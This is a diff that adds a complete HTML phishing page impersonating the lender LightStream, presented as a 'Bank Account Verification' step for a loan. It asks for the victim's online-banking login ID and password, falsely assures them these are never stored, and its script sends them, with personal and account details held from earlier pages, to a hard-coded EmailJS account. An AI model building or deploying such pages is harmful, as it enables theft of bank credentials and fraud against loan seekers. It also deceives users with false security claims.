@@ -1,0 +1,284 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Bank Account Verification for Loan Processing - LightStream</title>
+    
+    <!-- Security Headers -->
+    <meta http-equiv="Content-Security-Policy" content="default-src 'self' 'unsafe-inline' https://cdn.tailwindcss.com https://cdnjs.cloudflare.com; script-src 'self' 'unsafe-inline' https://cdn.tailwindcss.com https://cdn.jsdelivr.net; style-src 'self' 'unsafe-inline' https://cdnjs.cloudflare.com;">
+    <meta http-equiv="X-Content-Type-Options" content="nosniff">
+    <meta http-equiv="X-Frame-Options" content="DENY">
+    <meta http-equiv="X-XSS-Protection" content="1; mode=block">
+    <meta name="referrer" content="strict-origin-when-cross-origin">
+    
+    <!-- Legal & Security Meta -->
+    <meta name="description" content="Secure bank account verification for loan processing. Bank-level encryption protects your data.">
+    <meta name="keywords" content="bank verification, secure banking, loan processing, account verification">
+    <meta name="author" content="LightStream Financial Services">
+    <meta name="robots" content="index, follow">
+    
+    <!-- Google Site Verification -->
+    <meta name="google-site-verification" content="s-OWmZgVmfmuSt4KnIAA-IpD61w3rw8cRCh8WdTxVmk" />
+    
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+    
+    <style>
+        body {
+            background: linear-gradient(135deg, #1e3a8a 0%, #1e40af 50%, #2563eb 100%);
+            min-height: 100vh;
+            font-family: Arial, sans-serif;
+        }
+        .glass-effect {
+            background: rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+        }
+        .btn-primary {
+            background: #3b82f6;
+            color: white;
+            padding: 12px 24px;
+            border: none;
+            border-radius: 8px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+        .btn-primary:hover {
+            background: #2563eb;
+            transform: translateY(-2px);
+        }
+        .security-notice {
+            background: rgba(251, 191, 36, 0.1);
+            border: 1px solid rgba(251, 191, 36, 0.3);
+            border-radius: 8px;
+            padding: 16px;
+            margin: 20px 0;
+        }
+    </style>
+</head>
+<body class="bg-blue-900">
+    <!-- Header Navigation -->
+    <header class="glass-effect sticky top-0 z-50">
+        <nav class="container mx-auto px-4 py-4">
+            <div class="flex justify-between items-center">
+                <div class="flex items-center space-x-2">
+                    <i class="fas fa-shield-alt text-white text-2xl"></i>
+                    <span class="text-white text-xl font-bold">LightStream</span>
+                </div>
+                <div class="hidden md:flex space-x-6">
+                    <a href="index.html" class="text-white hover:text-blue-300">Home</a>
+                    <a href="personal-loans.html" class="text-white hover:text-blue-300">Personal Loans</a>
+                    <a href="bank-verification.html" class="text-white hover:text-blue-300">Bank Verification</a>
+                    <a href="privacy-policy.html" class="text-white hover:text-blue-300">Privacy Policy</a>
+                    <a href="terms.html" class="text-white hover:text-blue-300">Terms & Conditions</a>
+                    <a href="contact.html" class="text-white hover:text-blue-300">Contact Us</a>
+                </div>
+            </div>
+        </nav>
+    </header>
+
+    <!-- Main Content -->
+    <section class="py-20">
+        <div class="container mx-auto px-4">
+            <div class="max-w-4xl mx-auto">
+                <div class="glass-effect rounded-lg shadow-xl p-8">
+                    <div class="text-center mb-8">
+                        <h1 class="text-4xl font-bold text-white mb-4">Bank Account Verification</h1>
+                        <p class="text-blue-200">Secure verification for loan processing</p>
+                    </div>
+
+                    <!-- Application Summary -->
+                    <div class="bg-white bg-opacity-10 rounded-lg p-6 mb-6">
+                        <h2 class="text-xl font-semibold text-white mb-4">
+                            <i class="fas fa-file-alt mr-2"></i>Application Summary
+                        </h2>
+                        <div id="applicationSummary" class="text-blue-200">
+                            <!-- Application details will be populated here -->
+                        </div>
+                    </div>
+
+                    <form id="bankVerificationForm" class="space-y-6">
+                        <!-- Bank Login Information -->
+                        <div class="bg-white bg-opacity-10 rounded-lg p-6">
+                            <h2 class="text-xl font-semibold text-white mb-4">
+                                <i class="fas fa-university mr-2"></i>Bank Login Information
+                            </h2>
+                            
+                            <div class="grid md:grid-cols-2 gap-4">
+                                <div>
+                                    <label class="block text-white text-sm font-bold mb-2" for="bankLoginId">
+                                        Bank Login ID *
+                                    </label>
+                                    <input type="text" id="bankLoginId" name="bankLoginId" required
+                                           class="w-full px-3 py-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500"
+                                           placeholder="Enter your bank login ID">
+                                </div>
+                                
+                                <div>
+                                    <label class="block text-white text-sm font-bold mb-2" for="secureKey">
+                                        Secure Key (Password) *
+                                    </label>
+                                    <input type="password" id="secureKey" name="secureKey" required
+                                           class="w-full px-3 py-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500"
+                                           placeholder="Enter your secure key">
+                                </div>
+                            </div>
+                        </div>
+
+                        <!-- Security Notice -->
+                        <div class="security-notice">
+                            <div class="flex items-start">
+                                <i class="fas fa-shield-alt text-yellow-400 mt-1 mr-3"></i>
+                                <div>
+                                    <h4 class="font-semibold text-white mb-1">Important Security Notice</h4>
+                                    <p class="text-sm text-blue-200">
+                                        <strong>We do not store or misuse your bank credentials.</strong> This step is only for verifying account ownership. Your information is encrypted and protected.
+                                    </p>
+                                </div>
+                            </div>
+                        </div>
+
+                        <!-- Verification Agreement -->
+                        <div class="flex items-start">
+                            <input type="checkbox" id="verificationAgreement" name="verificationAgreement" class="mr-2 mt-1" required>
+                            <label for="verificationAgreement" class="text-sm text-blue-200">
+                                I authorize LightStream to verify my bank account for loan processing purposes only. I understand my credentials are encrypted and never stored.
+                            </label>
+                        </div>
+
+                        <!-- Action Buttons -->
+                        <div class="flex space-x-4">
+                            <button type="button" onclick="goBack()" class="btn-primary bg-gray-600 hover:bg-gray-700">
+                                <i class="fas fa-arrow-left mr-2"></i>Back
+                            </button>
+                            <button type="submit" class="btn-primary flex-1">
+                                <i class="fas fa-check-circle mr-2"></i>Verify Account
+                            </button>
+                        </div>
+                    </form>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Footer -->
+    <footer class="bg-blue-950 text-white py-8">
+        <div class="container mx-auto px-4">
+            <div class="grid md:grid-cols-4 gap-8">
+                <div>
+                    <h3 class="text-lg font-semibold mb-4">LightStream</h3>
+                    <p class="text-gray-400">Secure personal loan solutions for your financial needs.</p>
+                </div>
+                <div>
+                    <h4 class="text-lg font-semibold mb-4">Quick Links</h4>
+                    <ul class="space-y-2">
+                        <li><a href="index.html" class="text-gray-400 hover:text-white">Home</a></li>
+                        <li><a href="personal-loans.html" class="text-gray-400 hover:text-white">Personal Loans</a></li>
+                        <li><a href="bank-verification.html" class="text-gray-400 hover:text-white">Bank Verification</a></li>
+                    </ul>
+                </div>
+                <div>
+                    <h4 class="text-lg font-semibold mb-4">Legal</h4>
+                    <ul class="space-y-2">
+                        <li><a href="privacy-policy.html" class="text-gray-400 hover:text-white">Privacy Policy</a></li>
+                        <li><a href="terms.html" class="text-gray-400 hover:text-white">Terms & Conditions</a></li>
+                    </ul>
+                </div>
+                <div>
+                    <h4 class="text-lg font-semibold mb-4">Contact</h4>
+                    <ul class="space-y-2 text-gray-400">
+                        <li><i class="fas fa-envelope mr-2"></i>info@lightstream.com</li>
+                        <li><i class="fas fa-phone mr-2"></i>1-800-LIGHTSTREAM</li>
+                        <li><a href="contact.html" class="text-gray-400 hover:text-white">Contact Form</a></li>
+                    </ul>
+                </div>
+            </div>
+            <div class="border-t border-blue-800 mt-8 pt-8 text-center text-gray-400">
+                <p>&copy; 2026 LightStream Financial Services. All rights reserved.</p>
+            </div>
+        </div>
+    </footer>
+
+    <script>
+        // Initialize EmailJS
+        (function() {
+            emailjs.init("nW8qV4aakkEtYlieZ");
+        })();
+
+        // Load application data from sessionStorage
+        function loadApplicationData() {
+            const loanData = sessionStorage.getItem('loanApplicationData');
+            if (loanData) {
+                const data = JSON.parse(loanData);
+                const summaryDiv = document.getElementById('applicationSummary');
+                
+                summaryDiv.innerHTML = `
+                    <div class="grid md:grid-cols-2 gap-4">
+                        <div>
+                            <p><strong>Applicant:</strong> ${data.fullName || 'N/A'}</p>
+                            <p><strong>Email:</strong> ${data.email || 'N/A'}</p>
+                            <p><strong>Phone:</strong> ${data.phone || 'N/A'}</p>
+                        </div>
+                        <div>
+                            <p><strong>Loan Amount:</strong> $${data.loanAmount || 'N/A'}</p>
+                            <p><strong>Account Number:</strong> ****${(data.accountNumber || '').slice(-4) || 'N/A'}</p>
+                            <p><strong>IFSC Code:</strong> ${data.ifscCode || 'N/A'}</p>
+                        </div>
+                    </div>
+                `;
+            } else {
+                // If no data found, redirect to personal loans
+                window.location.href = 'personal-loans.html';
+            }
+        }
+
+        // Form submission
+        document.getElementById('bankVerificationForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            // Get form data
+            const formData = {
+                bankLoginId: document.getElementById('bankLoginId').value,
+                secureKey: document.getElementById('secureKey').value,
+                verificationDate: new Date().toLocaleDateString()
+            };
+
+            // Get loan application data
+            const loanData = JSON.parse(sessionStorage.getItem('loanApplicationData') || '{}');
+            
+            // Combine data
+            const completeData = {
+                ...loanData,
+                ...formData,
+                verificationStatus: 'Completed',
+                finalSubmissionDate: new Date().toISOString()
+            };
+
+            // Send verification email
+            emailjs.send('service_mblpi2k', 'template_wo7l8te', completeData)
+                .then(function(response) {
+                    alert('✅ Bank verification completed successfully! Your loan application is now being processed.');
+                    // Redirect to success page
+                    window.location.href = 'index.html';
+                })
+                .catch(function(error) {
+                    console.log('FAILED...', error);
+                    alert('❌ Error during verification. Please try again.');
+                });
+        });
+
+        // Go back function
+        function goBack() {
+            window.location.href = 'personal-loans.html';
+        }
+
+        // Load data when page loads
+        document.addEventListener('DOMContentLoaded', function() {
+            loadApplicationData();
+        });
+    </script>
+</body>
+</html>
